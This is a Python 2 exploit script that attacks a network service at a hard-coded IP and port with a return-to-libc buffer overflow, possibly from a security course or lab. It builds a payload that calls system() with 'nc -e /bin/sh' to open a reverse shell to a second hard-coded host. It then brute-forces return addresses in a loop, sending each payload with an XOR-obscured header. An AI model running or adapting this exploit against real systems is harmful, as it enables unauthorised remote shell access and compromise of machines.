#!/usr/bin/env python2
import socket
import struct
import binascii
import sys

DEST_IP = '129.10.115.56'
#DEST_IP = '127.0.0.1'
DEST_PORT = 2002
#DEST_PORT = 12000

#RET_ADDR = 0xffffd128
EXIT_ADDR = 0x080ae2e4
#SYSTEM_ADDR = 0xf7d3f190
SYSTEM_ADDR = 0xf7d15000 + 0x00040190
RET_ADDR = SYSTEM_ADDR
RET_ADDR_INCREMENT = 1


BUF_LEN = 1024 
SAFETY_PADDING = 0
MORE_PADDING = 4

SHELLCODE = struct.pack("<35s","nc -e /bin/sh 129.10.117.100 33900\0")
secret = EXIT_ADDR
#BUF_ADDR = 0xffffd128 - 0x100
BUF_ADDR = 0xffffd05f
# https://seshagiriprabhu.wordpress.com/2014/10/26/return-to-libc-attack/

def echo(payload):
    #print("Payload Length:",len(payload))
    sock = socket.create_connection((DEST_IP, DEST_PORT))
    msg_flags_= 65535
    encrypted_string = ''
    encrypted_packed_data_header = ''
    msg_len_ = len(payload)
    packed_data_header = struct.pack("<2H", msg_flags_, msg_len_)
    for i in range(0,2):
        encrypted_packed_data_header = encrypted_packed_data_header +packed_data_header[i]
    for i in range(2,4):
        encrypted_packed_data_header = encrypted_packed_data_header + chr(ord(packed_data_header[i])^6)
    sock.send(encrypted_packed_data_header)
    sock.send(payload)
    response = sock.recv(2048)
    print ("Response Length:",len(response))
    sock.close()

#def gen_exploit(ret_addr):
#    return \
#        '\x90' * (BUF_LEN - len(SHELLCODE) - SAFETY_PADDING) + \
#        SHELLCODE + \
#        'X' * (SAFETY_PADDING + LOCALS_AND_REGS-16)+ secret + 8*'X' + struct.pack('<I', ret_addr)  + secret
def gen_exploit(buf_addr):
    return '\x00' * (BUF_LEN - len(SHELLCODE) * 29 - SAFETY_PADDING) + SHELLCODE * 29 + '\x00' * (SAFETY_PADDING)+ 4*'\x00' +  struct.pack('<I', secret) + 12*'\x00' + struct.pack('<I', SYSTEM_ADDR)  + struct.pack('<I', secret)+ struct.pack('<I', buf_addr)
#print("ShellCode length:",len(SHELLCODE))
buf_addr = BUF_ADDR
while buf_addr < 0xffffffff:
    print 'Trying return address %x' % (buf_addr)
    payload = gen_exploit(buf_addr)
    echo(payload)
    buf_addr += RET_ADDR_INCREMENT


